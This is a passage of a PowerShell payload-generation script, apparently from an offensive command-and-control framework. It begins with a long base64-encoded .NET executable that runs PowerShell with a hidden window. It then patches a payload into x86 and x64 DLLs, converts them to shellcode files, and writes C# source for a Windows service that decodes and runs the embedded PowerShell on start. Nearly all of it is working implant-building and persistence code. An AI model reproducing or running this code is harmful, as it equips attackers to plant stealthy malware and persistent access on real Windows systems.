EAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAEEAQQBBAE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UCiwCBANoCIQAJAOICjwCJAPICjwCRAAADrgCZABQDswCRACUDuQAIAAQADQAIAAgAEgAuAAsAvwAuABMAyAA9AJMAJwE0AWkAeQAAAQMAQgABAAABBQBTAAIABIAAAAAAAAAAAAAAAAAAAAAA8AAAAAQAAAAAAAAAAAAAAAEAGwAAAAAAAQAAAAAAAAAAAAAAQgA/AQAAAAACAAAAAAAAAAAAAAABABsAAAAAAAAAAAAAPE1vZHVsZT4AcG9zaC5leGUAUHJvZ3JhbQBtc2NvcmxpYgBTeXN0ZW0AT2JqZWN0AFNXX0hJREUAU1dfU0hPVwBHZXRDb25zb2xlV2luZG93AFNob3dXaW5kb3cALmN0b3IASW52b2tlQXV0b21hdGlvbgBSdW5QUwBNYWluAGhXbmQAbkNtZFNob3cAY21kAFN5c3RlbS5SdW50aW1lLkNvbXBpbGVyU2VydmljZXMAQ29tcGlsYXRpb25SZWxheGF0aW9uc0F0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBwb3NoAFN5c3RlbS5SdW50aW1lLkludGVyb3BTZXJ2aWNlcwBEbGxJbXBvcnRBdHRyaWJ1dGUAa2VybmVsMzIuZGxsAHVzZXIzMi5kbGwAU3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbgBTeXN0ZW0uTWFuYWdlbWVudC5BdXRvbWF0aW9uLlJ1bnNwYWNlcwBSdW5zcGFjZUZhY3RvcnkAUnVuc3BhY2UAQ3JlYXRlUnVuc3BhY2UAT3BlbgBSdW5zcGFjZUludm9rZQBQaXBlbGluZQBDcmVhdGVQaXBlbGluZQBDb21tYW5kQ29sbGVjdGlvbgBnZXRfQ29tbWFuZHMAQWRkU2NyaXB0AFN5c3RlbS5Db2xsZWN0aW9ucy5PYmplY3RNb2RlbABDb2xsZWN0aW9uYDEAUFNPYmplY3QASW52b2tlAENsb3NlAFN5c3RlbS5UZXh0AFN0cmluZ0J1aWxkZXIAU3lzdGVtLkNvbGxlY3Rpb25zLkdlbmVyaWMASUVudW1lcmF0b3JgMQBHZXRFbnVtZXJhdG9yAGdldF9DdXJyZW50AEFwcGVuZABTeXN0ZW0uQ29sbGVjdGlvbnMASUVudW1lcmF0b3IATW92ZU5leHQASURpc3Bvc2FibGUARGlzcG9zZQBUb1N0cmluZwBTdHJpbmcAVHJpbQBFbmNvZGluZwBnZXRfVW5pY29kZQBDb252ZXJ0AEZyb21CYXNlNjRTdHJpbmcAR2V0U3RyaW5nAAAAAQAAI5EMZ9xZ3ka7bYqff77JfAAIt3pcVhk04IkCBggEAAAAAAQFAAAAAwAAGAUAAgIYCAMgAAEEAAEODgQAAQEOAwAAAQQgAQEIBCABAQ4EBwIYDggxvzhWrTZONQQAABIZBSABARIZBCAAEiEEIAASJQggABUSKQESLQYVEjUBEi0IIAAVEjkBEwAGFRI5ARItBCAAEwAFIAESMRwDIAACAyAADhoHCRIZEh0SIRUSNQESLRIxEi0OFRI5ARItAgQAABJJBQABHQUOBSABDh0FCAEACAAAAAAAHgEAAQBUAhZXcmFwTm9uRXhjZXB0aW9uVGhyb3dzAQD0KAAAAAAAAAAAAAAOKQAAACAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACkAAAAAAAAAAAAAAABfQ29yRXhlTWFpbgBtc2NvcmVlLmRsbAAAAAAA/yUAIEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAQAAAAIAAAgBgAAAA4AACAAAAAAAAAAAAAAAAAAAABAAEAAABQAACAAAAAAAAAAAAAAAAAAAABAAEAAABoAACAAAAAAAAAAAAAAAAAAAABAAAAAACAAAAAAAAAAAAAAAAAAAAAAAABAAAAAACQAAAAoEAAADwCAAAAAAAAAAAAAOBCAADqAQAAAAAAAAAAAAA8AjQAAABWAFMAXwBWAEUAUgBTAEkATwBOAF8ASQBOAEYATwAAAAAAvQTv/gAAAQAAAAAAAAAAAAAAAAAAAAAAPwAAAAAAAAAEAAAAAQAAAAAAAAAAAAAAAAAAAEQAAAABAFYAYQByAEYAaQBsAGUASQBuAGYAbwAAAAAAJAAEAAAAVAByAGEAbgBzAGwAYQB0AGkAbwBuAAAAAAAAALAEnAEAAAEAUwB0AHIAaQBuAGcARgBpAGwAZQBJAG4AZgBvAAAAeAEAAAEAMAAwADAAMAAwADQAYgAwAAAALAACAAEARgBpAGwAZQBEAGUAcwBjAHIAaQBwAHQAaQBvAG4AAAAAACAAAAAwAAgAAQBGAGkAbABlAFYAZQByAHMAaQBvAG4AAAAAADAALgAwAC4AMAAuADAAAAA0AAkAAQBJAG4AdABlAHIAbgBhAGwATgBhAG0AZQAAAHAAbwBzAGgALgBlAHgAZQAAAAAAKAACAAEATABlAGcAYQBsAEMAbwBwAHkAcgBpAGcAaAB0AAAAIAAAADwACQABAE8AcgBpAGcAaQBuAGEAbABGAGkAbABlAG4AYQBtAGUAAABwAG8AcwBoAC4AZQB4AGUAAAAAADQACAABAFAAcgBvAGQAdQBjAHQAVgBlAHIAcwBpAG8AbgAAADAALgAwAC4AMAAuADAAAAA4AAgAAQBBAHMAcwBlAG0AYgBsAHkAIABWAGUAcgBzAGkAbwBuAAAAMAAuADAALgAwAC4AMAAAAAAAAADvu788P3htbCB2ZXJzaW9uPSIxLjAiIGVuY29kaW5nPSJVVEYtOCIgc3RhbmRhbG9uZT0ieWVzIj8+DQo8YXNzZW1ibHkgeG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYxIiBtYW5pZmVzdFZlcnNpb249IjEuMCI+DQogIDxhc3NlbWJseUlkZW50aXR5IHZlcnNpb249IjEuMC4wLjAiIG5hbWU9Ik15QXBwbGljYXRpb24uYXBwIi8+DQogIDx0cnVzdEluZm8geG1sbnM9InVybjpzY2hlbWFzLW1pY3Jvc29mdC1jb206YXNtLnYyIj4NCiAgICA8c2VjdXJpdHk+DQogICAgICA8cmVxdWVzdGVkUHJpdmlsZWdlcyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9ImFzSW52b2tlciIgdWlBY2Nlc3M9ImZhbHNlIi8+DQogICAgICA8L3JlcXVlc3RlZFByaXZpbGVnZXM+DQogICAgPC9zZWN1cml0eT4NCiAgPC90cnVzdEluZm8+DQo8L2Fzc2VtYmx5Pg0KAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAgAAAMAAAAIDkAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAOEIAgAEAAAAAAAAAAAAAAC4/QVZfY29tX2Vycm9yQEAAAAAAAAAAADhCAIABAAAAAAAAAAAAAAAuP0FWdHlwZV9pbmZvQEAAOEIAgAEAAAAAAAAAAAAAAC4/QVZiYWRfYWxsb2NAc3RkQEAAAAAAADhCAIABAAAAAAAAAAAAAAAuP0FWZXhjZXB0aW9uQHN0ZEBAAAAAAAA4QgCAAQAAAAAAAAAAAAAALj9BVmJhZF9hcnJheV9uZXdfbGVuZ3RoQHN0ZEBAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACAQAAB1EAAA0FAAAIAQAADxEAAA3FAAABARAAAoEQAA6FAAADARAACTEgAA8FAAAKASAABXFwAABFEAAGAXAAB/GQAAAFIAAKAZAADPGQAAyFIAANAZAAB4GwAA1FIAAIAbAAC4GwAAEFMAALgbAADTGwAAQFMAANMbAADhGwAAVFMAAPAbAAAmHAAAEFMAACYcAABBHAAAHFMAAEEcAABPHAAAMFMAAFAcAABUHAAA6FAAAFQcAAB3HAAAZFMAAHccAACSHAAAfFMAAJIcAAClHAAAkFMAAKUcAAC1HAAAoFMAAMAcAAD0HAAAyFIAAAAdAAAoHQAACFMAAEAdAABhHQAAsFMAAGwdAACoHQAAtFQAAKgdAAD4HQAA6FAAAPgdAAAjHwAAtFMAACQfAACmHwAA4FMAAKgfAACdIAAAHFQAAKAgAAD0IAAACFQAAPQgAAAxIQAA2FQAADwhAAB1IQAA6FAAAHghAACsIQAA6FAAAKwhAADBIQAA6FAAAMQhAADsIQAA6FAAAOwhAAABIgAA6FAAAAQiAABlIgAACFQAAGgiAACYIgAA6FAAAJgiAACsIgAA6FAAAKwiAAD1IgAAtFQAAPgiAADBIwAAdFQAAMQjAABdJAAATFQAAGAkAACEJAAAtFQAAIQkAACvJAAAtFQAALAkAAD/JAAAtFQAAAAlAAAXJQAA6FAAABglAACdJQAAgFQAALAlAAABJgAAmFQAAAQmAAAvJgAAtFQAADAmAABkJgAAtFQAAGQmAAA1JwAAoFQAADgnAACpJwAAqFQAALQnAADzJwAAtFQAABQoAABTKAAAtFQAAHQoAACpKAAAtFQAAMAoAAACKQAAyFIAAAQpAAAkKQAACFMAACQpAABEKQAACFMAAFgpAAAEKgAAvFQAACgqAABDKgAA6FAAAEwqAACRKwAAyFQAAJQrAADeKwAA2FQAAOArAAAqLAAA2FQAADAsAAD2LQAA6FQAAAwuAAApLgAA6FAAACwuAACFLgAA+FQAABgvAACXLwAAgFQAALAvAACyLwAAAFUAANgvAAD1LwAA+FEAAA0wAAAqMAAA+FEAAFwwAAB8MAAA+FEAAKwwAADDMAAA+FEAAMMwAADfMAAA+FEAAN8wAAAVMQAARFQAABUxAAAtMQAAbFQAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAIAAAANwAAADYAAAAjAAAANgAAAEcAAABKAAAAEwAAAE4AAABQAAAATgAAAFcAAABOAAAAXQAAAAsAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAQAYAAAAGAAAgAAAAAAAAAAAAAAAAAAAAQACAAAAMAAAgAAAAAAAAAAAAAAAAAAAAQAJBAAASAAAAGDQAAB9AQAAAAAAAAAAAAAAAAAAAAAAADw/eG1sIHZlcnNpb249JzEuMCcgZW5jb2Rpbmc9J1VURi04JyBzdGFuZGFsb25lPSd5ZXMnPz4NCjxhc3NlbWJseSB4bWxucz0ndXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjEnIG1hbmlmZXN0VmVyc2lvbj0nMS4wJz4NCiAgPHRydXN0SW5mbyB4bWxucz0idXJuOnNjaGVtYXMtbWljcm9zb2Z0LWNvbTphc20udjMiPg0KICAgIDxzZWN1cml0eT4NCiAgICAgIDxyZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgICAgICA8cmVxdWVzdGVkRXhlY3V0aW9uTGV2ZWwgbGV2ZWw9J2FzSW52b2tlcicgdWlBY2Nlc3M9J2ZhbHNlJyAvPg0KICAgICAgPC9yZXF1ZXN0ZWRQcml2aWxlZ2VzPg0KICAgIDwvc2VjdXJpdHk+DQogIDwvdHJ1c3RJbmZvPg0KPC9hc3NlbWJseT4NCgAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAEAAADAAAADIodCh4KEgojCiOKJAokiiUKJYomCigKKIopCiqKKworiiGKswqzirAGAAAAwAAAAAoAAAAJAAABQAAACAq6iryKvwqxisAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="

    $payloadraw = [Convert]::ToBase64String($bytes)
    $RawBytes = [System.Convert]::FromBase64String($86)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x86'
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload_x86.dll", $dllBytes)
    Write-Host -Object "x86 DLL Written to: $FolderPath\payloads\proxypayload_x86.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File "$FolderPath\payloads\proxypayload_x86.dll"
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload-shellcode_x86.bin", $shellcodeBytes)
    Write-Host -Object "x86 Shellcode Written to: $FolderPath\payloads\proxypayload-shellcode_x86.bin"  -ForegroundColor Green

    $RawBytes = [System.Convert]::FromBase64String($64)
    $dllBytes = PatchDll -DllBytes $RawBytes -ReplaceString $payloadraw -Arch 'x64'
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload_x64.dll", $dllBytes)
    Write-Host -Object "x64 DLL Written to: $FolderPath\payloads\proxypayload_x64.dll"  -ForegroundColor Green
    
    $shellcodeBytes = ConvertTo-Shellcode -File "$FolderPath\payloads\proxypayload_x64.dll"
    [io.file]::WriteAllBytes("$FolderPath\payloads\proxypayload-shellcode_x64.bin", $shellcodeBytes)
    Write-Host -Object "x64 Shellcode Written to: $FolderPath\payloads\proxypayload-shellcode_x64.bin"  -ForegroundColor Green


    $praw = [Convert]::ToBase64String($bytes)
    $cscservicecode = 'using System;
    using System.Text;
    using System.ServiceProcess;
    using System.Collections.ObjectModel;
    using System.Management.Automation;
    using System.Management.Automation.Runspaces;


    namespace Service
    {
        static class Program
        {
            static void Main()
            {
                ServiceBase[] ServicesToRun;
                ServicesToRun = new ServiceBase[]
                {
                    new Service1()
                };
                ServiceBase.Run(ServicesToRun);
            }
        }
        public partial class Service1 : ServiceBase
        {
            public static string InvokeAutomation(string cmd)
            {
                Runspace newrunspace = RunspaceFactory.CreateRunspace();
                newrunspace.Open();
                RunspaceInvoke scriptInvoker = new RunspaceInvoke(newrunspace);
                Pipeline pipeline = newrunspace.CreatePipeline();

                pipeline.Commands.AddScript(cmd);
                Collection<PSObject> results = pipeline.Invoke();
                newrunspace.Close();

                StringBuilder stringBuilder = new StringBuilder();
                foreach (PSObject obj in results)
                {
                    stringBuilder.Append(obj);
                }
                return stringBuilder.ToString().Trim();
            }

            protected override void OnStart(string[] args)
            {
                try
                {
                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(tt);
                }
                catch (ArgumentException e)
                {
                    string tt = System.Text.Encoding.Unicode.GetString(System.Convert.FromBase64String("'+$praw+'"));
                    InvokeAutomation(tt);
                }
            }

            protected override void OnStop()
            {
            }
        }
    }'
    [IO.File]::WriteAllLines("$FolderPath\payloads\posh-proxy-service.cs", $cscservicecode)

    if (Test-Path "C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe") {
